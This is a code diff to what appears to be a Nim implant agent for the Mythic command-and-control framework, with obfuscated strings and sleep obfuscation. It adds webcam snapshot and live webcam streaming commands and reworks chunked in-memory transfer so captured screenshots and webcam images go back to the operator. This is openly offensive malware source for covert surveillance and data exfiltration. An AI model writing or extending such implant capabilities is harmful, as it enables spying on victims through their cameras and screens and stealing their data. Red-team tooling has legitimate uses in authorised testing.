@@ -58,6 +58,8 @@ when defined(windows):
     import tasks/spawnas
   when defined(cmd_register_file):
     import tasks/register_file
+  when defined(cmd_webcam_snap) or defined(cmd_webcam_stream):
+    import tasks/webcam
 
 when defined(windows):
   when defined(sleepObfuscationEkko):
@@ -77,7 +79,7 @@ type
     params: JsonNode  # Store original params for execute-assembly
   
   MonitoringTaskType* = enum
-    mtClipboardMonitor, mtPortscan
+    mtClipboardMonitor, mtPortscan, mtWebcamStream
   
   ProfileKind = enum
     pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
@@ -692,8 +694,35 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of obf("screenshot"):
         when defined(cmd_screenshot) and defined(windows):
-          # Screenshot doesn't use BackgroundTaskState, handled elsewhere
-          discard
+          # Screenshot uses btDownload with in-memory fileData for chunked transfer
+          if execResult.response.hasKey(obf("screenshot_data")):
+            let screenshotB64 = execResult.response[obf("screenshot_data")].getStr()
+            let screenshotBytes = cast[seq[byte]](decode(screenshotB64))
+            var state = BackgroundTaskState(
+              taskType: btDownload,
+              path: "",
+              fileId: "",
+              totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
+              currentChunk: 0,
+              fileData: screenshotBytes
+            )
+            agent.backgroundTasks[taskId] = state
+      
+      of obf("webcam_snap"):
+        when defined(cmd_webcam_snap) and defined(windows):
+          # webcam_snap uses same btDownload pattern as screenshot
+          if execResult.response.hasKey(obf("screenshot_data")):
+            let snapB64 = execResult.response[obf("screenshot_data")].getStr()
+            let snapBytes = cast[seq[byte]](decode(snapB64))
+            var state = BackgroundTaskState(
+              taskType: btDownload,
+              path: "",
+              fileId: "",
+              totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
+              currentChunk: 0,
+              fileData: snapBytes
+            )
+            agent.backgroundTasks[taskId] = state
       
       of obf("powershell_import"):
         when defined(cmd_powershell_import) and defined(windows):
@@ -743,6 +772,9 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     of obf("portscan"):
       when defined(cmd_portscan):
         agent.activeMonitoringTasks[taskId] = mtPortscan
+    of obf("webcam_stream"):
+      when defined(cmd_webcam_stream) and defined(windows):
+        agent.activeMonitoringTasks[taskId] = mtWebcamStream
     else:
       discard
     
@@ -765,6 +797,9 @@ proc checkBackgroundTasks*(agent: var Agent) =
     of mtPortscan:
       when defined(cmd_portscan):
         result = checkPortscan(taskId)
+    of mtWebcamStream:
+      when defined(cmd_webcam_stream) and defined(windows):
+        result = checkWebcamStream(taskId)
     
     if result != nil:
       agent.taskResponses.add(result)
@@ -839,7 +874,13 @@ proc postResponses*(agent: var Agent) =
         cleanResp.delete(obf("edges"))
         regularResponses.add(cleanResp)
     else:
-      regularResponses.add(resp)
+      # Strip internal fields that shouldn't be sent to Mythic
+      if resp.hasKey(obf("screenshot_data")):
+        var cleanResp = resp.copy()
+        cleanResp.delete(obf("screenshot_data"))
+        regularResponses.add(cleanResp)
+      else:
+        regularResponses.add(resp)
   
   # Build post_response message
   var postMsg = %*{
@@ -934,14 +975,15 @@ proc postResponses*(agent: var Agent) =
                 if state.currentChunk < state.totalChunks:
                   state.currentChunk += 1
                   
-                  # Differentiate between file download and screenshot (in-memory data)
+                  # Differentiate between file download and screenshot/webcam (in-memory data)
                   let chunkResp = if state.fileData.len > 0:
-                    # Screenshot - process from memory (Windows only)
+                    # In-memory data (screenshot or webcam_snap) - process from memory (Windows only)
                     when defined(cmd_screenshot) and defined(windows):
                       processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
+                    elif defined(cmd_webcam_snap) and defined(windows):
+                      processWebcamSnapChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                     else:
-                      # Should never happen on non-Windows, but return error
-                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
+                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("In-memory transfer not supported")}
                   else:
                     # File download - read from disk
                     processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
@@ -951,18 +993,20 @@ proc postResponses*(agent: var Agent) =
                   # Check if this was the last chunk
                   if state.currentChunk >= state.totalChunks:
                     let completeMsg = if state.fileData.len > 0:
-                      # Screenshot complete (Windows only)
+                      # In-memory transfer complete (Windows only)
                       when defined(cmd_screenshot) and defined(windows):
                         completeScreenshot(taskId, state.fileId)
+                      elif defined(cmd_webcam_snap) and defined(windows):
+                        completeWebcamSnap(taskId, state.fileId)
                       else:
-                        %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
+                        %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("In-memory transfer not supported")}
                     else:
                       # File download complete
                       completeDownload(taskId, state.fileId, state.path)
                     
                     agent.taskResponses.add(completeMsg)
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
+                    debug "[DEBUG] ", (if state.fileData.len > 0: "In-memory transfer" else: "Download"), " complete"
                   else:
                     agent.backgroundTasks[taskId] = state
             
